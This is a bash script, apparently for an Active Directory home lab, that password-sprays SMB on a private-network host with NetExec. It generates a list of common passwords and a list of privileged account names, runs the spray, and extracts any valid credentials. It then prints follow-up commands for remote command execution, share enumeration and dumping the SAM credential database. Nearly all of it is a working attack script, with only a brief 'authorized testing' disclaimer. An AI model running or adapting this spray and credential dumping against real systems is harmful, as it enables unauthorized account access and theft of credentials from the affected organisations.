#!/bin/bash
# Password Spraying Script for AD Lab
# Uses NetExec (nxc) for SMB password spraying
# WARNING: For authorized testing only!

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
TARGET_IP="192.168.56.102"
TARGET_DOMAIN="windomain.local"
PASSWORD_LIST="/tmp/passwordlist"
USER_LIST="/tmp/userlist"

# Create default password list if it doesn't exist
if [ ! -f "$PASSWORD_LIST" ]; then
    echo -e "${CYAN}[*] Creating default password list...${NC}"
    cat > "$PASSWORD_LIST" << 'EOF'
password
123456
12345678
qwerty
abc123
monkey
letmein
dragon
111111
baseball
iloveyou
trustno1
sunshine
princess
admin
welcome
shadow
ashley
football
jesus
michael
ninja
mustang
password1
123456789
diamond
admin123
letmein1
photoshop
qwerty123
qaz123wsx
qwertyuiop
login
master
hello
freedom
whatever
qazxsw
trustno1
batman
passw0rd
hacker
vagrant
EOF
    echo -e "${GREEN}[+] Password list created at $PASSWORD_LIST${NC}"
fi

# Create default user list if it doesn't exist
if [ ! -f "$USER_LIST" ]; then
    echo -e "${CYAN}[*] Creating default user list...${NC}"
    cat > "$USER_LIST" << 'EOF'
administrator
admin
vagrant
guest
krbtgt
EOF
    echo -e "${GREEN}[+] User list created at $USER_LIST${NC}"
fi

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  Password Spraying Script              ${NC}"
echo -e "${CYAN}  Target: $TARGET_IP                   ${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# Check if netexec is installed
if ! command -v nxc &> /dev/null; then
    echo -e "${YELLOW}[!] NetExec (nxc) not found. Attempting to install...${NC}"
    
    # Try to install via pip
    if command -v pip3 &> /dev/null; then
        pip3 install netexec
    elif command -v pip &> /dev/null; then
        pip install netexec
    else
        echo -e "${RED}[!] pip not found. Please install NetExec manually:${NC}"
        echo "    pip3 install netexec"
        echo "    or"
        echo "    apt install netexec"
        exit 1
    fi
fi

echo -e "${YELLOW}[Phase 1] SMB Password Spray${NC}"
echo "----------------------------------------"
echo -e "${CYAN}[*] Spraying passwords against SMB service...${NC}"
echo -e "${CYAN}    Users: $(wc -l < $USER_LIST)${NC}"
echo -e "${CYAN}    Passwords: $(wc -l < $PASSWORD_LIST)${NC}"
echo ""

# Run NetExec SMB password spray
# -u: username or userlist
# -p: password or passwordlist
# --continue-on-success: keep going even after finding valid creds
nxc smb "$TARGET_IP" -u "$USER_LIST" -p "$PASSWORD_LIST" --continue-on-success 2>&1 | tee "/tmp/spray_results_$(date +%Y%m%d_%H%M%S).txt"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  Password Spray Complete!              ${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${YELLOW}Review the output above for [+] indicators.${NC}"
echo -e "${YELLOW}Successful credentials will be marked with [+]${NC}"
echo ""

# Extract valid credentials from results
echo -e "${CYAN}[*] Extracting successful authentications...${NC}"
if grep -q "\[+]" "/tmp/spray_results_"*.txt 2>/dev/null; then
    echo -e "${GREEN}[+] Valid credentials found:${NC}"
    grep "\[+]" "/tmp/spray_results_"*.txt | grep -v "SMB" | tail -5
else
    echo -e "${YELLOW}[!] No successful authentications found with current wordlist.${NC}"
fi

echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  1. If successful, run: nxc smb $TARGET_IP -u <user> -p <password> -x 'whoami /priv'"
echo "  2. Enumerate shares: nxc smb $TARGET_IP -u <user> -p <password> --shares"
echo "  3. Dump SAM: nxc smb $TARGET_IP -u <user> -p <password> --sam"
echo ""
